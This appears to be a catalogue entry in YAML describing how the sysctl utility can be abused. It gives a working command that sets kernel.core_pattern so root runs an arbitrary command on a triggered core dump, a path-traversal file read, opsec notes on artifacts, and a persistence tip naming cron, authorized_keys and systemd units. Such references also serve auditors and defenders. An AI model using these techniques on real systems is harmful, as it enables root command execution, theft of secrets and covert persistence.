---
name: sysctl
capabilities:
- exec
- read
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: sysctl 'kernel.core_pattern=|/path/to/command'
  notes: |-
    The command is executed by `root` in the background when a core dump occurs.

    To trigger a core dump, send the `SIGQUIT` signal to a process, for example:

    ```
    sleep infinity &
    kill -QUIT $!
    ```
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: sysctl -n "/../../path/to/input-file"
references:
- https://gtfobins.github.io/gtfobins/sysctl/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
